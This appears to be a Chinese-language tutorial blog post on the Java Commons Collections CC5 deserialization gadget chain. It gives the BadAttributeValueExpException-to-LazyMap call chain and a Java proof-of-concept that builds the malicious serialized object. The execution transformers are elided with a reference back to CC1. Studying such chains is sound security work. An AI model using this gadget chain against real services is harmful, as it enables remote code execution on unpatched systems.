---
title: "Java CC · CC5：BadAttributeValueExpException 入口"
series: java-cc-deserialization
series_order: 6
date: 2026-04-25 11:00:00 +0800
categories:
  - javaCC
---
# CC5：BadAttributeValueExpException 新入口


### 为什么需要 CC5？
在 JDK 8u71 修复了 `AnnotationInvocationHandler` 后，寻找新的入口成为关键。CC5 发现了 `javax.management.BadAttributeValueExpException`，该类的 `readObject` 方法会调用 `toString()` 方法。

### 核心原理
利用 `TiedMapEntry` 的 `toString()` 方法，该方法会调用 `getValue()`，进而触发 `LazyMap.get()`。

**调用链：**
```text
BadAttributeValueExpException.readObject()
  → valObj.toString()
    → TiedMapEntry.toString()
      → TiedMapEntry.getValue()
        → LazyMap.get()
          → factory.transform()
```

### 完整 POC
构造时需要通过反射将 `val` 字段设为 `TiedMapEntry`，且在构造函数中传入 `null` 以避免本地触发。

```java
package com.nk7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] realTransformers = new Transformer[]{
            // ... 同 CC1 的执行链
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "nk7");

        // 关键：构造时不传 tme，防止本地触发
        BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
        Field val = bavee.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bavee, tme);

        // 替换真链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, realTransformers);

        serialize(bavee);
        unserialize("ser.bin");
    }
}
```

### 绕过与防护分析
CC5 再次证明了“入口”的多样性。即使修复了 `AnnotationInvocationHandler`，JDK 中仍存在其他可利用的类。这表明单纯修补某个类无法解决问题，需要系统性的防御方案。
